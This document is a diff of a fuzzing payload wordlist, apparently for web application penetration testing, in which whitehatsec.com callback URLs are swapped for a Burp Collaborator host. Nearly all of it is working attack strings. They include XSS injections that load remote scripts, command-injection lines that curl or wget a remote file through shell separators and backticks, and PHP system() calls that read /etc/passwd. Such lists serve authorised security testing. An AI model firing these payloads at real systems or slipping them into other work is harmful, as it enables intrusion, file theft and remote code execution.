@@ -20,7 +20,7 @@ Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY47V) AppleWebKit/537.36 (KHT
 Mozilla/5.0 (iPhone; U; CPU iPhone OS 5_1_1 like Mac OS X; da-dk) AppleWebKit/534.46.0 (KHTML, like Gecko) CriOS/19.0.1084.60 Mobile/9B206 Safari/7534.48.3
 Baiduspider ( http://www.baidu.com/search/spider.htm)
 Mozilla/5.0 (compatible; Googlebot/2.1;  http://www.google.com/bot.html)
-whitehatsec XSS Agent"><script/src=https://whitehatsec.com/.testing/useragent.js>
+whitehatsec XSS Agent"><script/src=https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/useragent.js>
 #############LOGIC TESTS
 true
 false
@@ -39,12 +39,12 @@ false
 9
 #############OPEN REDIRECT
 http://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
-https://whitehatsec.com
+https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
 .nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
-.whitehatsec.com
+.nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
 http://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
 //nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
-whitehatsec.com
+nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
 nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net
 #############HYPERLINK INJECTION
 javascript:alert(1)//INJECTX
@@ -223,12 +223,12 @@ $(`cat /etc/passwd`)
 cat /etc/passwd
 | curl http://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce.txt
 & curl http://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce.txt
-; curl https://whitehatsec.com/.testing/rce_vuln.txt
-&& curl https://whitehatsec.com/.testing/rce_vuln.txt
-curl https://whitehatsec.com/.testing/rce_vuln.txt
- curl https://whitehatsec.com/.testing/rce_vuln.txt ||`curl https://whitehatsec.com/.testing/rce_vuln.txt` #' |curl https://whitehatsec.com/.testing/rce_vuln.txt||`curl https://whitehatsec.com/.testing/rce_vuln.txt` #\" |curl https://whitehatsec.com/.testing/rce_vuln.txt
-curl https://whitehatsec.com/.testing/rce_vuln.txt ||`curl https://whitehatsec.com/.testing/rce_vuln.txt` #' |curl https://whitehatsec.com/.testing/rce_vuln.txt||`curl https://whitehatsec.com/.testing/rce_vuln.txt` #\" |curl https://whitehatsec.com/.testing/rce_vuln.txt
-$(`curl https://whitehatsec.com/.testing/rce_vuln.txt?req=22jjffjbn`)
+; curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt
+&& curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt
+curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt
+ curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt ||`curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt` #' |curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt||`curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt` #\" |curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt
+curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt ||`curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt` #' |curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt||`curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt` #\" |curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt
+$(`curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt?req=22jjffjbn`)
 dir
 | dir
 ; dir
@@ -237,10 +237,10 @@ $(`dir`)
 &&dir
 && dir
 ;echo%20'<script>alert(1)</script>'
-echo '<img src=https://whitehatsec.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+echo '<img src=https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
 ;echo '<script>alert(1)</script>'
 echo '<script>alert(1)</script>'// XXXXXXXXXXX
-echo '<script src=https://whitehatsec.com/.testing/xss.js></script>'// XXXXXXXXXXX
+echo '<script src=https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/xss.js></script>'// XXXXXXXXXXX
 eval('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
 eval('ls')
 eval('pwd')
@@ -281,11 +281,11 @@ perl -e 'print "X"x2048'
 phpinfo()
 phpinfo();
 <?php system("cat /etc/passwd");?>
-<?php system("curl https://whitehatsec.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
-<?php system("curl https://whitehatsec.com/.testing/rce_vuln.txt?req=df2fkjj");?>
+<?php system("curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt?req=df2fkjj");?>
 <?php system("echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX");?>
-<?php system("wget https://whitehatsec.com/.testing/rce_vuln.txt?method=phpsystem_get");?>
-<?php system("wget https://whitehatsec.com/.testing/rce_vuln.txt?req=jdfj2jc");?>
+<?php system("wget https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt?method=phpsystem_get");?>
+<?php system("wget https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt?req=jdfj2jc");?>
 :phpversion();
 `ping 127.0.0.1`
 & ping -i 30 127.0.0.1 &
@@ -304,12 +304,12 @@ pwd
 system('cat C:\boot.ini');
 system('cat config.php');
 system('cat /etc/passwd');
-|| system('curl https://whitehatsec.com/.testing/rce_vuln.txt');
-| system('curl https://whitehatsec.com/.testing/rce_vuln.txt');
-; system('curl https://whitehatsec.com/.testing/rce_vuln.txt');
-& system('curl https://whitehatsec.com/.testing/rce_vuln.txt');
-&& system('curl https://whitehatsec.com/.testing/rce_vuln.txt');
-system('curl https://whitehatsec.com/.testing/rce_vuln.txt')
+|| system('curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt');
+| system('curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt');
+; system('curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt');
+& system('curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt');
+&& system('curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt');
+system('curl https://nxo3bppvpgasqooigrr0nxvytpzfn4.burpcollaborator.net/.testing/rce_vuln.txt')
 system('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX')
 systeminfo
 | systeminfo
